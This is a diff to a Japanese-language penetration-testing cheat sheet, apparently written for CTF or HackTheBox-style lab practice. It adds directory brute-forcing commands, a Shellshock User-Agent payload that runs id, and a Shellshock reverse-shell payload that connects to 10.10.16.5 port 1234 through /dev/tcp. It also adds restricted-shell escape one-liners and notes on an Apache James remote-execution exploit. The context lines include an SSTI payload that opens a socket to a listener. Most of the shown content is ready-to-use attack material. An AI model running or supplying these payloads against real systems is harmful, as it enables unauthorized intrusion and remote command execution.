@@ -324,16 +324,30 @@ dirb http://website.com -r -z 10
 
 #### Gobuster
 ```
-gobuster dir -t 50 -u <url>  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,py -o <output filename> -k
+gobuster dir -t 50 -u <url>  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -f -x php,txt,py,html,png,jpg -o <output filename> -k
 ```
--dir...ディレクトリ総当たり
+- dir...ディレクトリ総当たり
 - -t...スレッド数
 - -u...URL指定
 - -w...wordlistの指定
 - -o...ファイル出力
+- -f...ディレクトリの末尾に「/」を追加
 - -x...拡張子指定
 - -k...SSLをスキップ
 - -s...ステータスコードの指定
+
+#### feroxbuster
+```
+feroxbuster -u http://10.10.10.56 -f -n -x php,html
+```
+- -u...URL指定
+- -n...再起的スキャンをしない(/server-statusが検出された時に不都合)
+- -x...拡張子の指定
+- -f...ディレクトリの末尾に「/」を追加
+- -w...wordlistの指定
+- -o...ファイル出力
+- -t...スレッド数(デフォルトは50)
+- -k...SSLをスキップ
 
 #### ffuf
 ```
@@ -518,6 +532,23 @@ SSRFの脆弱性が主に見つかる箇所としては、以下の4点が挙げ
 ```
 {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
 ```
+
+### ShellShock
+CGIに使用される拡張子を指定して、feroxbusteerなどをかける。
+```
+feroxbuster -u http://10.10.10.56/cgi-bin/ -x cgi,sh,pl
+```
+ShellShockが実行される環境では変数が空であるため、コマンドにはフルパスが必要。
+```
+User-Agent: () { :;}; echo; /usr/bin/id
+```
+![](./image/2022-03-07-13-21-33.png)  
+
+#### Reverse Shell
+```
+User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/10.10.16.5/1234 0>&1
+```
+
 
 ## CMS
 - CMSの特定後、ログインページについて調査
@@ -1400,6 +1431,15 @@ docker pull kalilinux/kali-rolling:latest --platform linux/arm64
 ## x86用gccコンパイル
 ```
 sudo apt install libc6-dev-i386
+```
+
+## Escape rbash
+```
+ssh user@10.10.10.1 -t "bash --noprofile"
+ssh user@10.10.10.1 -t bash
+```
+```
+BASH_CMDS[a]=/bin/sh;a
 ```
 
 ## base64,16進数 → テキスト
@@ -2882,6 +2922,11 @@ https://www.exploit-db.com/exploits/18650
 
 PHPLiteAdmin 1.9.3 - Remote PHP Code Injection:
 https://www.exploit-db.com/exploits/24044
+
+Apache James Server 2.3.2 - Remote Command Execution:
+使用条件としてJAMES Remote Administrationがデフォルトのroot:rootでログインできるのに加えて、エクスプロイト実行後に誰かがログインする必要がある。
+エクスプロイト後にsshなどでログインされることでペイロードが発火するため、実世界では誰かがログインするのを待つ必要がある。
+https://www.exploit-db.com/exploits/35513
 ```
 
 ## Privilege Escalation(Linux)
